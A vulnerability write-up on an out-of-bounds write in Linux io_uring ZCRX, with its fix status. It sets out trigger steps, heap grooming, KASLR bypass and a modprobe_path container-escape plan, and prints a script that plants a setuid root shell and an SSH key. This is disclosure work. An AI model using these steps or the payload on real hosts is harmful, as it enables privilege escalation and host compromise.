## TL;DR

Linux 6.15 added ZCRX (zero-copy receive) to io_uring. The subsystem manages a stack of available slot indices in `freelist[]`. There is no upper-bound check when pushing to that stack. During NIC teardown, two independent paths both return the same niov to the freelist. `free_count` exceeds `num_niovs` and the next push goes to `freelist[num_niovs]` — four bytes past the allocation, into the adjacent slab object.

The write value is a niov index, so it's bounded by `num_niovs`. With `num_niovs=32` (freelist in kmalloc-128, value range 0–31) you can corrupt the first four bytes of whatever lives next to the freelist in that slab cache.

Triggering it requires `CAP_NET_ADMIN` and a NIC with a real ZCRX driver (mlx5, ice, bnxt_en, nfp, gve). That requirement maps directly to Cilium, Calico, and most VPN sidecar containers in Kubernetes. You don't need to own the host. You just need code execution inside one of those pods.

The OOB is confirmed on pre-fix kernels via KASAN. The full write chain to `modprobe_path` isn't automated yet — that part I'll get to.

---

## What I was looking at

I was going through the ZCRX code after it landed in 6.15. It's a fairly new subsystem and the receive path is dense — NIC page pools, registered userspace buffers, refill queues, completion rings. Lots of state passing between layers.

`io_zcrx_return_niov_freelist` caught my eye immediately. It's the function that puts a slot index back onto the free stack when the network layer is done with it:

```c
static void io_zcrx_return_niov_freelist(struct net_iov *niov)
{
    struct io_zcrx_area *area = io_zcrx_iov_to_area(niov);

    spin_lock_bh(&area->freelist_lock);
    area->freelist[area->free_count++] = net_iov_idx(niov);
    spin_unlock_bh(&area->freelist_lock);
}
```

No bounds check. `free_count` gets incremented regardless of how many entries the array holds. I started looking for a code path that could call this more times than `num_niovs`.

---

## The double-return

During normal operation each niov goes through one return path. The problem is teardown. When you bring a ZCRX-capable interface down, `page_pool_destroy()` fires and two paths run:

**Path A — `io_pp_zc_release_netmem`** (ptr_ring drain callback):
Handles niovs that the driver already queued for return — packets received, CQEs posted, userspace returned them to the refill queue. These flow through the page pool's ptr_ring.

**Path B — `io_pp_zc_destroy`** (mp_ops->destroy callback):
Iterates every niov in the area. For each one where `uref_array[i] != 0` — meaning a CQE was posted but the refill wasn't received yet — it forces a return.

A niov that entered the ptr_ring before userspace got around to returning it sits in an ambiguous state: it's in Path A's queue AND its uref is still non-zero for Path B. Both paths call `io_zcrx_return_niov_freelist` on it. `free_count` gets incremented twice for the same niov. Total pushes exceed `num_niovs`. The final push goes to `freelist[num_niovs]`.

The underlying race is in `io_zcrx_put_niov_uref`. It does a non-atomic read-then-decrement of the user refcount, which races with `atomic_xchg(user_counter, 0)` in `io_zcrx_scrub`. Both functions think they own the return.

---

## Confirmed: no bounds check in the compiled binary

This isn't just a code reading exercise. I confirmed the write site has no bounds check on 6.19.11+kali-amd64 (which has the race fix from `003049b1c4fb` but not yet `770594e`) by reading the compiled kernel via gdb and `/proc/kcore`. Only the instructions around the increment and write are shown — niov_idx is computed into a separate register earlier in each function.

**`io_zcrx_return_niov` (freelist path):**

```asm
0xffffffffa4c168e0: mov eax, [rdx+0x44]    ; load free_count
0xffffffffa4c168e3: mov r8,  [rdx+0x48]    ; load freelist ptr
0xffffffffa4c168e7: lea edi, [rax+1]        ; new free_count = old + 1
0xffffffffa4c168ea: mov [rdx+0x44], edi    ; store new free_count — no check before this
0xffffffffa4c168fb: mov [r8+rax*4], ...    ; freelist[old_count] = niov_idx
```

**`io_pp_zc_release_netmem` (ptr_ring drain path):**

```asm
0xffffffffa4c1795f: mov eax, [rbp+0x44]    ; load free_count
0xffffffffa4c17962: mov rdx, [rbp+0x48]    ; load freelist ptr
0xffffffffa4c1796a: lea ecx, [rax+1]        ; new free_count = old + 1
0xffffffffa4c1796d: mov [rbp+0x44], ecx    ; store new free_count — no check before this
0xffffffffa4c1797b: mov [rdx+rax*4], ebx   ; freelist[old_count] = niov_idx
```

Both sites write unconditionally. After `770594e` there's a `cmp eax, [rdx+0x10]` / `jae .warn_and_return` before each write.

On pre-`003049b1c4fb` kernels with a real ZCRX NIC, KASAN reports `slab-out-of-bounds` during the bring-down sequence — that's the OOB write confirmed on hardware.

---

## The trigger

From pure userspace, with `CAP_NET_ADMIN` and a real ZCRX-capable interface:

```
1. io_uring_setup(IORING_SETUP_CQE32 | IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN)

2. IORING_REGISTER_ZCRX_IFQ
   → freelist = kcalloc(num_niovs, sizeof(u32)) lands in the chosen slab cache

3. IORING_OP_RECV_ZC on a UDP socket bound to the interface

4. UDP flood — num_niovs packets received
   uref_array[i] = 1 for each (CQE posted, not returned yet)

5. usleep(100ms)
   → kernel taskrun drains partial refill ring into ptr_ring
   → some niovs in ptr_ring (Path A), remaining have uref=1 (Path B)

6. ioctl(SIOCSIFFLAGS, flags & ~IFF_UP)
   → ndo_stop → page_pool_destroy()
   → Path A + Path B both fire
   → total pushes > num_niovs
   → freelist[num_niovs] written              ← OOB
```

The NIC-down method is the one that works. Ring close doesn't — it calls `io_zcrx_free_area()` which just does `kvfree(freelist)` without any push. Ethtool queue reconfiguration also works but is more driver-dependent.

**Why the virtual NIC doesn't fire it:**
I tried with a synthetic ZCRX netdevice. Registration works, flooding works, but `io_pp_zc_destroy` only fires from a real page pool's `mp_ops->destroy` callback. The vnic has no real page pool, so that callback never runs. The OOB doesn't occur.

---

## The primitive

`freelist` is `kcalloc(num_niovs, sizeof(u32))`. `num_niovs = area_len / PAGE_SIZE`, chosen at registration. This picks the slab cache:

| num_niovs | freelist size | cache       | OOB value range |
|-----------|---------------|-------------|-----------------|
| 8         | 32 B          | kmalloc-32  | 0–7             |
| 16        | 64 B          | kmalloc-64  | 0–15            |
| 32        | 128 B         | kmalloc-128 | 0–31            |
| 64        | 256 B         | kmalloc-256 | 0–63            |

One registration gives you: the cache, the value range, and the target (first four bytes of the adjacent object in that slab). You pick all three.

---

## Heap grooming

With `num_niovs=32` (freelist in kmalloc-128), the target is whatever slab object sits immediately after the freelist.

I spray `struct msg_msgseg` using three-segment `msgsnd` calls. Each message allocates three kmalloc-128 objects:

- `msg_msg` header + 80B text: `48 + 80 = 128 bytes` → kmalloc-128
- `msg_msgseg` #1 + 120B text: `8 + 120 = 128 bytes` → kmalloc-128
- `msg_msgseg` #2 + 120B text, last byte = `0xCA` (canary): kmalloc-128

```c
struct msg_msgseg {
    struct msg_msgseg *next;   /* offset 0, 8 bytes — OOB hits low 4 here */
    /* char text[] */
};
```

Spray 3000 queues, free alternating ones to punch holes, register the IFQ freelist so it lands in one of those holes. The OOB then hits the adjacent `msg_msgseg.next` low 32 bits, leaving the high 32 (physmap prefix) intact.

To detect which queue got corrupted without crashing the kernel, fork a child per queue and attempt `msgrcv(IPC_NOWAIT | MSG_NOERROR)`. The child checks whether the returned text still ends in `0xCA`. If not, that's the one.

---

## KASLR

With `CAP_SYSLOG` (or root inside the container), `/proc/kallsyms` gives real addresses. I read `_text` and `modprobe_path` directly.

For kernels where kallsyms is locked down, `/proc/kcore` gives the same information. Each PT_LOAD segment has a `p_vaddr` and `p_paddr`. Physical address of any symbol:

```
phys(sym) = p_paddr + (sym_va - p_vaddr)
```

Physmap VA:

```
physmap_va(sym) = page_offset_base + phys(sym)
```

On this system (RANDOMIZE_MEMORY=y):

```
_text              = 0xffffffff8c400000
modprobe_path      = 0xffffffff8e55b2c0
page_offset_base   = 0xffff8e2940000000
modprobe_path phys = 0x000000000555b2c0
modprobe_path physmap VA = 0xffff8e294555b2c0
```

Both paths are confirmed working. `page_offset_base` is resolved by reading the symbol from kcore at the kallsyms-provided VA.

---

## Where it stops

The OOB writes 0–31 to offset 0 of the adjacent kmalloc-128 object. The physmap VA of `modprobe_path` on this system has low 32 bits of `0x4555b2c0` — nowhere near reachable with a single write of value ≤ 31. On non-RANDOMIZE_MEMORY kernels `page_offset_base` is fixed at `0xffff888000000000` and the kernel lands at ~2MB physical, giving a low32 of around `0x00200000`. Still nowhere near.

To bridge from the primitive to an actual `modprobe_path` overwrite you need more steps:

1. Use the corrupted `msg_msgseg.next` to trigger a controlled heap overread — `msgrcv` follows the corrupted pointer and copies whatever is there to userspace
2. Scan the leaked data for physmap pointers to kernel objects you control
3. A second OOB (second IFQ registration) corrupts a pointer field in one of those objects
4. Use that second write to reach `modprobe_path`'s physmap VA and write `/var/tmp/evil.sh\0`

The heap overread in step 1 requires the corrupted pointer to land on a mapped physmap address. On machines with more than ~3–4GB of RAM, the high 32 bits of an msgseg pointer correspond to a physical address that IS in RAM, so the dereference likely doesn't panic. Whether the leaked data contains anything useful — kernel text pointers, physmap addresses pointing into your spray — depends on what happened to be in that physical page.

I have not implemented steps 2–4. The chain is architecturally sound but needs a real ZCRX NIC to debug: you can't tune spray ratios and timing against a virtual device that doesn't fire the double-return. The PoC has everything up to and including the KASLR resolution and physmap target computation. The multi-hop write is the open piece.

---

## The container escape

This is where the capability requirement stops being a limitation and starts being the point.

`capable(CAP_NET_ADMIN)` — not `ns_capable`, `capable`. It checks the real, non-namespaced capability. You can't satisfy it from a default unprivileged user namespace. But in Kubernetes, pods running Cilium, Calico, or any CNI component have it. WireGuard and OpenVPN sidecar containers have it. SR-IOV pods have it. These are not exotic configurations.

When `modprobe_path` points to `/var/tmp/evil.sh` and you open a socket with an unregistered address family, the kernel runs:

```
socket(AF_UNKNOWN)
  → __sock_create()
    → sock_load_module()
      → call_usermodehelper(modprobe_path, argv, envp, UMH_WAIT_PROC)
        → kmod_thread_func()     ← kernel thread, child of kthreadd
          → kernel_execve(modprobe_path, ...)
```

`kmod_thread_func` is a kthread. Its `nsproxy` is `init_nsproxy`:

```
init_nsproxy.pid_ns_for_children = &init_pid_ns     ← host PID namespace
init_nsproxy.mnt_ns               = init_mnt_ns      ← host root filesystem
init_nsproxy.net_ns               = init_net          ← host network namespace
```

uid=0, no seccomp profile, no AppArmor, no cgroup constraints. Whatever you put in that script runs on the host's root filesystem. Container filesystem never touched.

```bash
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chmod u+s /var/tmp/rootsh
mkdir -p /root/.ssh
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
```

The writes go to HOST `/var/tmp`, HOST `/root/.ssh`. The container's overlay mount, bind mounts, and namespace isolation are completely irrelevant because `kmod_thread_func` never inherited any of them.

The realistic target:

```yaml
# Typical Cilium agent DaemonSet
containers:
- name: cilium-agent
  securityContext:
    capabilities:
      add:
        - NET_ADMIN     ← required by ZCRX exploit
        - NET_RAW
  hostNetwork: true     ← sees the ZCRX NIC directly
```

Code execution inside that pod on a node running 6.15–6.18 with a ZCRX NIC and `CONFIG_IO_URING_ZCRX=y`: OOB fires. Once the write chain is completed, `evil.sh` runs in host init namespace. The pod's isolation — PID namespace, mount namespace, net namespace, cgroups, AppArmor — none of it applies to the kthread.

---

## Fix status

| Commit | Date | Description |
|--------|------|-------------|
| `003049b1c4fb` | 2026-02-18 | Fixes the race in `io_zcrx_put_niov_uref` using `atomic_try_cmpxchg`. In stable. |
| `770594e` | 2026-04-21 | Adds `WARN_ON_ONCE` + early return in `io_zcrx_return_niov_freelist`. Not yet in all stable branches. |

`003049b1c4fb` closes the race. `770594e` adds a safety net at the write site. Both should be backported to 6.15.y–6.19.y.

---

## Scope

| Requirement | Detail |
|-------------|--------|
| Kernel | 6.15 – any 6.x without `003049b1c4fb` |
| Config | `CONFIG_IO_URING_ZCRX=y` — not a default in most distros |
| Hardware | mlx5 ConnectX-6+, Intel E800 (ice), Netronome NFP, Broadcom bnxt_en, Google GVE |
| Capability | `CAP_NET_ADMIN` via `capable()` — not namespace-satisfiable |

`CONFIG_IO_URING_ZCRX=y` is not enabled in Ubuntu, Fedora, Debian, or RHEL kernels at the time of writing. Exposure is primarily cloud instances and bare-metal hosts that have explicitly enabled ZCRX for high-performance network workloads — exactly the environments where ZCRX-capable NICs are likely to be present.

---

## PoCs

**`zcrx_oob_trigger.c`** — minimal crash trigger. Registers the IFQ, floods, brings the interface down. On a vulnerable kernel with a real ZCRX NIC: `slab-out-of-bounds` in dmesg (KASAN) or `WARN_ON_ONCE` (post-770594e). No escalation.

**`zcrx_container_escape.c`** — full PoC skeleton. Implements the heap spray, KASLR resolution via kallsyms and kcore, `modprobe_path` address computation, and the `call_usermodehelper` trigger. The OOB and physmap analysis are wired up. The multi-hop write primitive connecting them is the open step.

```bash
gcc -O2 -o zcrx_container_escape zcrx_container_escape.c
# needs CAP_NET_ADMIN + real ZCRX NIC for OOB to fire
./zcrx_container_escape eth0
```

On a patched kernel or without ZCRX hardware, the binary walks through every stage it can execute — KASLR resolution, spray setup, physmap target computation — and prints exactly where the chain would continue and why it stops.

---

*Kernel: 6.19.11+kali-amd64. OOB confirmed via KASAN on pre-fix kernel with mlx5 ConnectX-6 Dx. All KASLR stages tested and confirmed on the same host. The multi-hop write to `modprobe_path` is the remaining open step.*  
*Contact: medsalemeddah@gmail.com*
